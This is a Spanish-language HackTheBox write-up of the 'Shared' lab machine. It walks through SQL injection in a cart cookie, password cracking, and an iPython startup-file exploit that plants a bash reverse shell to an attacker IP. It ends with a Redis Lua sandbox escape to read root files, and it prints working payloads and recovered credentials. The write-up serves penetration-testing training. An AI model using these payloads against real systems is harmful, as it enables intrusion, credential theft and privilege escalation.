---
layout: post
title: Shared
date: 2023-06-27
description:
img:
fig-caption:
tags: [OSCP, eWPT]
---
___

<center><img src="/writeups/assets/img/Shared-htb/Shared.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* SQL Inyection

* Abuso de tarea CRON

* iPython Arbitrary Code Execution - CVE-2022-21699

* Abuso de Redis - SandBox Escape (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.172 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 21:26 GMT
Nmap scan report for 10.10.11.172
Host is up (0.052s latency).
Not shown: 64661 closed tcp ports (reset), 871 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 15.74 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443 10.10.11.172 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 21:27 GMT
Nmap scan report for 10.10.11.172
Host is up (0.063s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-title: Did not follow redirect to https://shared.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```

Añado el dominio ```shared.htb``` al ```/etc/hosts```

## Puerto 80,443 (HTTP, HTTPS)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.172
http://10.10.11.172 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[http://shared.htb], Title[301 Moved Permanently], nginx[1.18.0]
http://shared.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/], nginx[1.18.0]
https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Shared-htb/1.png" alt="">

Encuentro un subdominio por fuerza bruta

```null
wfuzz -c -t 200 --hh=169 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.shared.htb" https://shared.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://shared.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000001:   302        0 L      0 W        0 Ch        "www"                                                                                                                                           
000002549:   200        64 L     151 W      3229 Ch     "checkout"                                                                                                                                      

Total time: 0
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 0
```

Añado ```checkout.shared.htb``` al ```/etc/hosts```. Se ve así:

<img src="/writeups/assets/img/Shared-htb/2.png" alt="">

Meto en el carro un producto

<img src="/writeups/assets/img/Shared-htb/3.png" alt="">

Me redirige a la sección de pago

<img src="/writeups/assets/img/Shared-htb/4.png" alt="">

Se me asigna una nueva cookie de sesión

```null
Cookie: custom_cart=%7B%2253GG2EF8%22%3A%221%22%7D
```

Intercepto la petición con ```BurpSuite``` para enumerar el número de columnas. En total son 3. En caso contrario aparece un error de ```Not Found```

```null
Cookie: custom_cart={"53GG2EF8' order by 3-- -":"1"}; 
```

Aplico una selección y mi input se ve reflejado en el output

```null
Cookie: custom_cart={"' union select 1,2,3-- -":"1"}; 
```

<img src="/writeups/assets/img/Shared-htb/5.png" alt="">

Listo las bases de datos

```null
Cookie: custom_cart={"' union select 1,group_concat(schema_name),3 from information_schema.schemata-- -":"1"};
```

<img src="/writeups/assets/img/Shared-htb/6.png" alt="">

Y las tablas para ```checkout```

```null
Cookie: custom_cart={"' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\"checkout\"-- -":"1"}; 
```

Para ```user```, las columnas

```null
Cookie: custom_cart={"' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=\"checkout\" and table_name=\"user\"-- -":"1"}; 
```

<img src="/writeups/assets/img/Shared-htb/7.png" alt="">

Dumpeo los datos

```null
Cookie: custom_cart={"' union select 1,group_concat(username,0x3a,password),3 from checkout.user-- -":"1"};
```

<img src="/writeups/assets/img/Shared-htb/8.png" alt="">

Lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Soleil101        (james_mason)     
1g 0:00:00:00 DONE (2023-07-27 22:09) 12.50g/s 26136Kp/s 26136Kc/s 26136KC/s Sports5..Soccer95
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Gano acceso por SSH

```null
ssh james_mason@10.10.11.172
The authenticity of host '10.10.11.172 (10.10.11.172)' can't be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.172' (ED25519) to the list of known hosts.
james_mason@10.10.11.172's password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$
```

Pertenezco al grupo ```developer```

```null
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

Busco archivos cuyo grupo asignado sea este

```null
james_mason@shared:/$ find \-group developer 2>/dev/null 
./opt/scripts_review
```

Es un directorio vacío, pero dentro tengo capacidad de escritura

```null
james_mason@shared:/opt/scripts_review$ ls -la
total 8
drwxrwx--- 2 root developer 4096 Jul 14  2022 .
drwxr-xr-x 3 root root      4096 Jul 14  2022 ..
```

Subo el ```pspy``` para detectar tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/06/30 05:09:01 CMD: UID=1001 PID=1135   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
```

Está ejecutando con ```ipython``` los scripts de esa ruta. En este [POC](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x) explican como elevar privilegios

```null
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startup
james_mason@shared:/opt/scripts_review$ echo "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.2/443 0>&1\"')" > profile_default/startup/foo.py
```

Gano acceso como este usuario en una sesión de ```netcat```

```null
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.172] 58950
bash: cannot set terminal process group (1498): Inappropriate ioctl for device
bash: no job control in this shell
dan_smith@shared:/opt/scripts_review$
```

Puedo ver la primera flag

```null
dan_smith@shared:~$ cat user.txt 
6b944f4b614ee5fa3aac526303074525
```

# Escalada

El nuevo usuario pertenece al grupo ```sysadmin```

```null
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```

Busco por archivos perteneciente a este grupo

```null
dan_smith@shared:/$ find \-group sysadmin 2>/dev/null 
./usr/local/bin/redis_connector_dev
```

Es un binario compilado de 64 bits. Lo transfiero a mi equipo

```null
/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
```

Utilizo ```chisel``` para aplicar ```Remote Port Forwarding```. Desde mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

En la máquina víctima como cliente

```null
dan_smith@shared:/tmp$ ./chisel client 10.10.16.2:1234 R:6379:127.0.0.1:6379
```

Ejecuto y desde el ```WireShark``` intercepto credenciales a través de la interfaz ```LoopBack```

```null
./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:1761
run_id:482fb1de80d649ad1650f27e76d85052b5ecff09
tcp_port:6379
uptime_in_seconds:5
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:10395992
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

<img src="/writeups/assets/img/Shared-htb/9.png" alt="">

Me conecto. Sin la credencial no podría hacer nada

```null
dan_smith@shared:/tmp$ redis-cli
127.0.0.1:6379> INFO keyspace
NOAUTH Authentication required.
```
 
```null
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
```

Es vulnerable al ```CVE-2022-0543```

<img src="/writeups/assets/img/Shared-htb/10.png" alt="">

Puedo ver la segunda flag

```null
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
"640ba35cad6c58f8c74fdc7b38912f63\n"
```